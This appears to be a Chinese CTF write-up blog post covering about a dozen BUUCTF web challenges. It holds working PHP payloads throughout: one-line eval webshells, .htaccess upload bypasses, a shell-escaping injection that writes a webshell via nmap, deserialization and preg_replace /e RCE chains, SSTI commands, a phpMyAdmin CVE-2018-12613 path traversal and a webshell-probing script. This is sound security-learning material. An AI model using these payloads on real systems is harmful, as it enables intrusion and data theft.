+<div class="hljs code-wrapper"><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+</code></pre></div>
+<p>值不等，md5相等即可。md5碰撞。</p>
+<p>4.0e开头MD5的MD5为0e的MD5</p>
+<div class="hljs code-wrapper"><pre><code>0e215962017 
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://err0r.top/article/md5/">标明出处：https://err0r.top/article/md5/</a> </p>
+<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p><img src="/2021/10/21/BUU/NiZhuanSiWei-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>读取源码，无有效信息—&gt;useless.php</p>
+<div class="hljs code-wrapper"><pre><code>//绕过第一个if
+
+?text=data://text/plain,welcome to the zjctf
+
+?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
+
+//读取useless.php文件内容
+
+&amp;file=php://filter/read=convert.base64-encode/resource=useless.php
+</code></pre></div>
+<p><img src="/2021/10/21/BUU/NiZhuanSiWei-2.png" srcset="/img/loading.gif" lazyload></p>
+<div class="hljs code-wrapper"><pre><code>//构造序列化类
+&lt;?php
+
+class Flag&#123;  //flag.php
+    public $file;
+    public function __tostring()&#123;
+        if(isset($this-&gt;file))&#123;
+            echo file_get_contents($this-&gt;file);
+            echo &quot;&lt;br&gt;&quot;;
+            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        &#125;
+    &#125;
+&#125;
+
+$get= new Flag();
+
+$get-&gt;file=&quot;flag.php&quot;;
+
+print_r(serialize($get));
+?&gt;
+
+当$file变量被当作字符串$password使用时，__tostring()方法自动调用，--get flag.php
+
+---&gt;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;
+
+
+最终payload:
+?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;
+
+---&gt;get flag
+</code></pre></div>
+<h2 id="文件包含–php为协议"><a href="#文件包含–php为协议" class="headerlink" title="文件包含–php为协议"></a>文件包含–php为协议</h2><p><a href="https://opn90.top/2021/10/27/PHP-ways/">详–&gt;https://opn90.top/2021/10/27/PHP-ways/</a> </p>
+<h2 id="php-tostring"><a href="#php-tostring" class="headerlink" title="php __tostring()"></a>php __tostring()</h2><p>当一个对象被当作字符串对待的时候，会触发这个魔术方法</p>
+<p><img src="/2021/10/21/BUU/NiZhuanSiWei-3.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p><img src="/2021/10/21/BUU/youmom-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>《一键去世》</p>
+<p><img src="/2021/10/21/BUU/youmom-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>fuzz了一下，只有php文件后缀被ban</p>
+<div class="hljs code-wrapper"><pre><code>传码
+&lt;?@eval($_POST[&#39;a&#39;]);?&gt;
+</code></pre></div>
+<p><img src="/2021/10/21/BUU/youmom-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传成功</p>
+<p>1.上传.htaccess配置文件</p>
+<div class="hljs code-wrapper"><pre><code>AddType application/x-httpd-php .jpg
+</code></pre></div>
+<p>抓包，将Content-Type改为image/png，绕过过滤—&gt;上传成功</p>
+<p>用蚁剑连1.png文件</p>
+<p>根目录下get flag</p>
+<p>2.上传.user.ini文件</p>
+<p>需要在同一目录下存在php文件</p>
+<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>将所有.jpg为后缀的文件作为php文件解析</p>
+<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><div class="hljs code-wrapper"><pre><code>&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler &#123;
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() &#123;          //初始化
+        $op = &quot;1&quot;;
+        $filename = &quot;/tmp/tmpfile&quot;;
+        $content = &quot;Hello World!&quot;;
+        $this-&gt;process();
+    &#125;
+
+    public function process() &#123;    //判断op的值   op=1---&gt;写    op=2---&gt;读
+        if($this-&gt;op == &quot;1&quot;) &#123;
+            $this-&gt;write();
+        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        &#125; else &#123;
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        &#125;
+    &#125;
+
+    private function write() &#123;           //写文件
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;   
+            if(strlen((string)$this-&gt;content) &gt; 100) &#123;        //限制content长度
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            &#125;
+            $res = file_put_contents($this-&gt;filename, $this-&gt;content);    //将content输入到filename文件当中
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        &#125; else &#123;
+            $this-&gt;output(&quot;Failed!&quot;);
+        &#125;
+    &#125;
+
+    private function read() &#123;        //返回 filename 的内容
+        $res = &quot;&quot;;
+        if(isset($this-&gt;filename)) &#123;
+            $res = file_get_contents($this-&gt;filename);
+        &#125;
+        return $res;
+    &#125;
+
+    private function output($s) &#123;     //打印变量
+        echo &quot;[Result]: &lt;br&gt;&quot;;
+        echo $s;
+    &#125;
+
+    function __destruct() &#123;         //实例销毁 2-&gt;1 content 置空  ---&gt;  process      
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;        /////===&gt;需对content置空进行绕过
+        $this-&gt;process();
+    &#125;
+&#125;
+
+function is_valid($s) &#123;         //限制字符在32-125之间
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+&#125;
+
+if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
+    $str = (string)$_GET[&#39;str&#39;];
+    if(is_valid($str)) &#123;
+        $obj = unserialize($str);
+    &#125;
+&#125;
+</code></pre></div>
+<p><strong>代码逻辑：</strong><br>1.在对象obj销毁时执行函数__destruct()，进行对服务器文件的读写<br>2.绕过__destruct()函数的，2的强比较，对content置空<br>3.设置op的值，1/2，对服务器文件进行读/写  </p>
+<p>卡了…没看到</p>
+<div class="hljs code-wrapper"><pre><code>    include(&quot;flag.php&quot;);
+</code></pre></div>
+<p>发现不需要写文件，只要读取就可以了…</p>
+<div class="hljs code-wrapper"><pre><code>构造exp        
+///为op赋值2读取文件
+
+&lt;?php
+class FileHandler
+&#123;
+    public $op=2;
+    public $filename=&quot;flag.php&quot;;
+    public $content=&quot;111&quot;;
+&#125;
+
+$hel=new FileHandler();
+
+print_r(serialize($hel));
+</code></pre></div>
+<h2 id="强弱类型比较"><a href="#强弱类型比较" class="headerlink" title="强弱类型比较"></a>强弱类型比较</h2><div class="hljs code-wrapper"><pre><code>$this-&gt;op === &quot;2&quot; || $this-&gt;op == &quot;2&quot;
+
+$this-&gt;op === &quot;2&quot;
+强类型， $op=2 ， $op=&quot;2&quot;  int类型，不同于string，绕过
+弱类型， $op=&quot;2&quot;  绕过
+</code></pre></div>
+<h2 id="参数类型的解释"><a href="#参数类型的解释" class="headerlink" title="参数类型的解释"></a>参数类型的解释</h2><p>对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p>
+<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>给源码的简单绕waf</p>
+<div class="hljs code-wrapper"><pre><code>I put something in F12 for you
+include &#39;flag.php&#39;;
+$flag=&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
+if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;
+    $id=$_GET[&#39;id&#39;];
+    $gg=$_GET[&#39;gg&#39;];
+    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
+        echo &#39;You got the first step&#39;;
+        if(isset($_POST[&#39;passwd&#39;])) &#123;
+            $passwd=$_POST[&#39;passwd&#39;];
+            if (!is_numeric($passwd))
+            &#123;
+                 if($passwd==1234567)
+                 &#123;
+                     echo &#39;Good Job!&#39;;
+                     highlight_file(&#39;flag.php&#39;);
+                     die(&#39;By Retr_0&#39;);
+                 &#125;
+                 else
+                 &#123;
+                     echo &quot;can you think twice??&quot;;
+                 &#125;
+            &#125;
+            else&#123;
+                echo &#39;You can not get it !&#39;;
+            &#125;
+
+        &#125;
+        else&#123;
+            die(&#39;only one way to get the flag&#39;);
+        &#125;    
+&#125;
+    else &#123;
+        echo &quot;You are not a real hacker!&quot;;
+    &#125;
+&#125;
+else&#123;
+    die(&#39;Please input first&#39;);
+    &#125;
+&#125;
+</code></pre></div>
+<hr>
+<div class="hljs code-wrapper"><pre><code>GET    
+?id[]=1&amp;gg[]=2
+POST    
+passwd=1234567a
+</code></pre></div>
+<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p><img src="/2021/10/21/BUU/BabyUpload-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>waf: 后缀名不能有ph、过滤png文件、存在内容php类型的过滤</p>
+<h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><p>上传变种一句话，jpg文件</p>
+<p><img src="/2021/10/21/BUU/BabyUpload-2.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="htaccess配置文件"><a href="#htaccess配置文件" class="headerlink" title=".htaccess配置文件"></a>.htaccess配置文件</h2><p>上传.htaccess配置文件，将目录下的jpg文件当作php文件解析</p>
+<p><img src="/2021/10/21/BUU/BabyUpload-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>连接蚁剑，根目录下拿flag</p>
+<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>java…先放一放</p>
+<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><div class="hljs code-wrapper"><pre><code>&lt;?php
+
+    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;
+        $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
+    &#125;
+
+    if(!isset($_GET[&#39;host&#39;])) &#123;
+        highlight_file(__FILE__);
+    &#125; else &#123;
+        $host = $_GET[&#39;host&#39;];
+
+        //escapeshellarg与escapeshellcmd使用不当
+        $host = escapeshellarg($host);
+        $host = escapeshellcmd($host);
+        
+        //创建sandbox 并使用目录
+        $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);
+        echo &#39;you are in sandbox &#39;.$sandbox;
+        @mkdir($sandbox);
+        chdir($sandbox);
+
+        //利用点
+        echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
+    &#125;
+</code></pre></div>
+<p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
+<p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
+<p>构造payload</p>
+<div class="hljs code-wrapper"><pre><code>&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;
+
+escapeshellarg---&gt;先将&#39;转义，然后进行前后分段&#39;闭合
+&#39;&#39;\&#39;&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;\&#39;&#39;&#39;
+
+escapeshellcmd---&gt;先将\等字符进行转义，然后对不配对的&#39;进行转义
+&#39;&#39;\\&#39;&#39;\&lt;\?php eval\(\$_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39;&#39;
+</code></pre></div>
+<p>构造payload，给沙盒地址，连蚁剑，get flag</p>
+<h3 id="细节处理"><a href="#细节处理" class="headerlink" title="细节处理"></a>细节处理</h3><p><img src="/2021/10/21/BUU/Online-Tool-1.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="escapeshellarg与escapeshellcmd使用不当"><a href="#escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="escapeshellarg与escapeshellcmd使用不当"></a>escapeshellarg与escapeshellcmd使用不当</h2><p><a href="https://opn90.top/2021/10/27/PHP-ways/#escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93">参考：https://opn90.top/2021/10/27/PHP-ways/#escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93</a></p>
+<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>进入界面显示本地IP地址</p>
+<p>抓包，发X-Forwarded-For，改变显示</p>
+<p>尝试sql注入，无果(down了)</p>
+<p>尝试ssti模板注入，有回显，且无过滤</p>
+<p>payload:</p>
+<div class="hljs code-wrapper"><pre><code>&#123;&#123;system('ls')&#125;&#125;
+
+&#123;&#123;system('ls /')&#125;&#125;
+
+//get flag
+&#123;&#123;system('cat /flag')&#125;&#125;
+</code></pre></div>
+<p>…知识面还是不够广，容易宕机…</p>
+<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><h2 id="git文件泄露"><a href="#git文件泄露" class="headerlink" title=".git文件泄露"></a>.git文件泄露</h2><p>用GitHack down下所泄露的文件</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php
+include &quot;flag.php&quot;;
+echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
+if(isset($_GET[&#39;exp&#39;]))&#123;
+    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;
+        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;
+            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;
+                // echo $_GET[&#39;exp&#39;];
+                @eval($_GET[&#39;exp&#39;]);
+            &#125;
+            else&#123;
+                die(&quot;还差一点哦！&quot;);
+            &#125;
+        &#125;
+        else&#123;
+            die(&quot;再好好想想！&quot;);
+        &#125;
+    &#125;
+    else&#123;
+        die(&quot;还想读flag，臭弟弟！&quot;);
+    &#125;
+&#125;
+// highlight_file(__FILE__);
+?&gt;
+</code></pre></div>
+<p>分析源码</p>
+<p>1.ban了data、filter、php、phar常用伪协议<br>2.很经典的正则匹配无参数RCE，(?R)?表示的是引用当前表达式一次或多次。有效的payload形式是令函数作为参数 套娃：a(b())<br>传入的参数只能包括小写字母、下划线、逗号、括号，还要以;结尾<br>3.ban掉了一些关键字</p>
+<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>1.先读取目录</p>
+<div class="hljs code-wrapper"><pre><code>//读取当前目录---&gt;flag.php index.php 
+print_r(scandir(pos(localeconv())));
+</code></pre></div>
+<p>2.读文件</p>
+<div class="hljs code-wrapper"><pre><code>//
+show_source(next(array_reverse(scandir(pos(localeconv())))));
+</code></pre></div>
+<h2 id="其他解法（session-id-实现任意文件读取）"><a href="#其他解法（session-id-实现任意文件读取）" class="headerlink" title="其他解法（session_id()实现任意文件读取）"></a>其他解法（session_id()实现任意文件读取）</h2><p>…(没完全看懂，就不写了)</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/12868440.html">https://www.cnblogs.com/LLeaves/p/12868440.html</a></p>
+<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>鎴戞湁涓€涓暟鎹簱锛屼絾閲岄潰浠€涔堜篃娌℃湁~<br>涓嶄俊浣犳壘</p>
+<p>…</p>
+<p>—&gt;robots.txt—&gt;Disallow: phpinfo.php—&gt;不会分析 down </p>
+<p>—&gt;扫一下—&gt;phpmyadmin…</p>
+<p>…</p>
+<h2 id="CVE-2018-12613-phpMyadmin-CVE-2018-12613-后台任意文件包含漏洞"><a href="#CVE-2018-12613-phpMyadmin-CVE-2018-12613-后台任意文件包含漏洞" class="headerlink" title="CVE-2018-12613 phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞"></a>CVE-2018-12613 phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞</h2><p><a target="_blank" rel="noopener" href="https://www.xiinnn.com/article/e7c68814.html">https://www.xiinnn.com/article/e7c68814.html</a></p>
+<p>payload:</p>
+<div class="hljs code-wrapper"><pre><code>//抄作业
+phpmyadmin/?target=db_sql.php%253f/../../../../../../../../flag
+</code></pre></div>
+<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><div class="hljs code-wrapper"><pre><code>&lt;?php
+
+error_reporting(0);
+$text = $_GET[&quot;text&quot;];
+$file = $_GET[&quot;file&quot;];
+if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;))&#123;
+    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+    if(preg_match(&quot;/flag/&quot;,$file))&#123;
+        die(&quot;Not now!&quot;);
+    &#125;
+
+    include($file);  //next.php
+
+&#125;
+else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre></div>
+<p>审计源码</p>
+<p>伪协议绕过</p>
+<div class="hljs code-wrapper"><pre><code>/?text=data://text/plain,I+have+a+dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php
+</code></pre></div>
+<p>读出next.php</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php
+$id = $_GET[&#39;id&#39;];
+$_SESSION[&#39;id&#39;] = $id;
+
+function complex($re, $str) &#123;
+    return preg_replace(
+        &#39;/(&#39; . $re . &#39;)/ei&#39;,
+        &#39;strtolower(&quot;\\1&quot;)&#39;,
+        $str
+    );
+&#125;
+
+
+foreach($_GET as $re =&gt; $str) &#123;//$re参数的key，$str就是参数的value
+    echo complex($re, $str). &quot;\n&quot;;
+&#125;
+
+function getFlag()&#123;
+    @eval($_GET[&#39;cmd&#39;]);
+&#125;
+</code></pre></div>
+<h2 id="preg-replace-e-模式下的代码漏洞问题"><a href="#preg-replace-e-模式下的代码漏洞问题" class="headerlink" title="preg_replace() /e 模式下的代码漏洞问题"></a>preg_replace() /e 模式下的代码漏洞问题</h2><p><a target="_blank" rel="noopener" href="http://www.xinyueseo.com/websecurity/158.html">附上博客：http://www.xinyueseo.com/websecurity/158.html</a><br><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/">附上博客：http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">附上博客：https://xz.aliyun.com/t/2557</a></p>
+<p>preg_replace()函数最后以/e结尾时，会存在命令执行漏洞，也就是说如果有/e，并且匹配到符合正则表达式的字符串，那么第二个参数的字符串将被当做代码来执行</p>
+<p>php5.5.0 后/e 修饰符已经被弃用了</p>
+<h2 id="正则匹配的-反向引用"><a href="#正则匹配的-反向引用" class="headerlink" title="正则匹配的 反向引用"></a>正则匹配的 反向引用</h2><p>对一个正则表达式模式或部分模式,两边添加圆括号,将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数  </p>
+<h2 id="strtolower-“-1”"><a href="#strtolower-“-1”" class="headerlink" title="strtolower(“\1”)"></a>strtolower(“\1”)</h2><p>所以这里的 1 实际上指定的是第一个子匹配项</p>
+<p><a target="_blank" rel="noopener" href="http://www.xinyueseo.com/websecurity/158.html">附上博客：http://www.xinyueseo.com/websecurity/158.html</a><br><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/">附上博客：http://www.lmxspace.com/2018/08/12/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84preg-replace%E5%87%BD%E6%95%B0/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">附上博客：https://xz.aliyun.com/t/2557</a></p>
+<h2 id="PHP-当非法字符为首字母时，只有点号会被替换成下划线"><a href="#PHP-当非法字符为首字母时，只有点号会被替换成下划线" class="headerlink" title="PHP:当非法字符为首字母时，只有点号会被替换成下划线"></a>PHP:当非法字符为首字母时，只有点号会被替换成下划线</h2><p><img src="/2021/10/21/BUU/ZJCTF-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里解释下用\S*而不是用.*的原因：<br>因为在php中，对于传入非法的$_GET参数名，会将其转换为下划线，导致正则匹配失效<br>所以我们只能使用\S*或者\S%2b来进行构造payload</p>
+<p>payload </p>
+<div class="hljs code-wrapper"><pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);
+</code></pre></div>
+<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>index.php 存在php报错</p>
+<p>分析源码，抓包，</p>
+<div class="hljs code-wrapper"><pre><code>func=&amp;p=
+</code></pre></div>
+<p>获取两个上传变量，猜测后端语句</p>
+<div class="hljs code-wrapper"><pre><code>$func($p);
+</code></pre></div>
+<p>尝试直接执行系统命令，回显hacker…，尝试执行其他函数，读文件获取相关信息，报错</p>
+<div class="hljs code-wrapper"><pre><code>call_user_func() expects parameter 1 to be a valid callback, function &#39;xxx&#39; not found or invalid function name in /var/www/html/index.php on line 24
+</code></pre></div>
+<p>更新猜测</p>
+<div class="hljs code-wrapper"><pre><code>call_user_func($func,$p);
+</code></pre></div>
+<p>读取源码</p>
+<div class="hljs code-wrapper"><pre><code>func=file_get_contents&amp;p=index.php
+</code></pre></div>
+<p>部分源码</p>
+<div class="hljs code-wrapper"><pre><code>$disable_fun=&#123;...&#125;
+
+ function gettime($func, $p) &#123;
+    $result = call_user_func($func, $p);
+    $a= gettype($result);
+    if ($a == &quot;string&quot;) &#123;
+        return $result;
+    &#125; else &#123;return &quot;&quot;;&#125;
+&#125;
+
+class Test &#123;
+    var $p = &quot;Y-m-d h:i:s a&quot;;
+    var $func = &quot;date&quot;;
+    function __destruct() &#123;
+        if ($this-&gt;func != &quot;&quot;) &#123;
+            echo gettime($this-&gt;func, $this-&gt;p);
+        &#125;
+    &#125;
+&#125;
+
+$func = $_REQUEST[&quot;func&quot;];
+$p = $_REQUEST[&quot;p&quot;];
+
+if ($func != null) &#123;
+    $func = strtolower($func);
+    if (!in_array($func,$disable_fun)) &#123;
+        echo gettime($func, $p);
+    &#125;else &#123;
+        die(&quot;Hacker...&quot;);
+    &#125;
+&#125;
+</code></pre></div>
+<p>尝试寻找函数绕过…ban 的有点多<br>发现(无用)类Test，没有ban serialize，其销毁方法也调用了执行函数，尝试反序列化</p>
+<p>exp </p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php
+class Test &#123;
+    var $p = &quot;ls /&quot;;
+    var $func = &quot;system&quot;;
+&#125;
+
+$a= new Test();
+print_r(serialize($a));
+</code></pre></div>
+<p>find / -name flag*<br>找到一堆… </p>
+<p>在/tmp/flagoefiu4r93中..</p>
+<p>payload</p>
+<div class="hljs code-wrapper"><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
+</code></pre></div>
+<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p><img src="/2021/10/21/BUU/phpweb-1.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><div class="hljs code-wrapper"><pre><code>/www.tar.gz
+下载源码
+</code></pre></div>
+<p>用D盾扫出了一堆…</p>
+<p><img src="/2021/10/21/BUU/goodhacker-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>写脚本遍历危险函数，测试可用性，确定利用点</p>
+<div class="hljs code-wrapper"><pre><code>import os
+import re
+import requests
+import threading
+
+dirr = &#39;&#39;
+files = os.listdir(dirr)                                # 获取文件夹下的文件
+reg = re.compile(r&#39;(?&lt;=_GET\[\&#39;).*(?=\&#39;\])&#39;)            # 设置正则匹配
+
+def thread1():
+    for i in files:  # 循环文件
+        print(&quot;----------------------&quot;, i)
+        url = &quot;&quot;  # url (docker适配的php版本)
+        f = open(dirr + i)  # 打开这个文件
+        data = f.read()  # 读取文件内容
+        f.close()  # 关闭文件
+
+        result = reg.findall(data)  # 从文件内容中找到GET请求
+
+        for j in result:  # 循环GET参数
+            payload = url + i + &quot;?&quot; + j + &quot;=echo+123456&quot;  # 尝试请求次路径，并执行命令
+            print(payload)
+            html = requests.get(payload)
+            if &quot;123456&quot; in html.text:
+                print(&quot;*****************************&quot;, payload)
+                exit(1)
+
+p1 = threading.Thread(target=thread1())
+p1.start()
+</code></pre></div>
+<p>尝试多进程加速<br>有亿点丑，但有效<br>编码能力还需要改进   </p>
+<div class="hljs code-wrapper"><pre><code>import os
+import re
+import time
+import requests
+import threading
+
+dirr = &#39;&#39;
+files1 = os.listdir(dirr)                               # 获取文件夹下的文件
+files2 = os.listdir(dirr)                               # 获取文件夹下的反序文件
+files2.sort()
+files2.reverse()
+reg = re.compile(r&#39;(?&lt;=_GET\[\&#39;).*(?=\&#39;\])&#39;)            # 设置正则匹配
+
+
+def thread1(files, a):
+    for i in files:                                     # 循环文件
+        if a == 1:
+            print(&quot;1111111----------------------&quot;, i)
+        elif a == 2:
+            print(&quot;2222222----------------------&quot;, i)
+        url = &quot;&quot;             # url (docker适配的php版本)
+        f1 = open(dirr + i)                             # 打开这个文件
+        data = f1.read()                                # 读取文件内容
+        f1.close()                                      # 关闭文件
+
+        result = reg.findall(data)                      # 从文件内容中找到GET请求
+
+        for j in result:                                # 循环GET参数
+            payload = url + i + &quot;?&quot; + j + &quot;=echo+123456&quot;  # 尝试请求次路径，并执行命令
+            print(payload)
+            html = requests.get(payload)
+            if &quot;123456&quot; in html.text:
+                print(&quot;*****************************&quot;, payload)
+                exit(1)
+
+
+p1 = threading.Thread(target=thread1, args=(files1, 1))
+p2 = threading.Thread(target=thread1, args=(files2, 2))
+p1.start()
+p2.start()
+</code></pre></div>
+<p>payload </p>
+<div class="hljs code-wrapper"><pre><code>/xk0SzyKwfzw.php?Efa5BVG=cat+/flag
+</code></pre></div>
+<h2 id="python-不可变对象"><a href="#python-不可变对象" class="headerlink" title="python 不可变对象"></a>python 不可变对象</h2><p>可变对象–字典，集合，列表</p>
+<p>共用一个地址</p>
+<p>不可变对象–数字，字符串，元组，不可变集合</p>
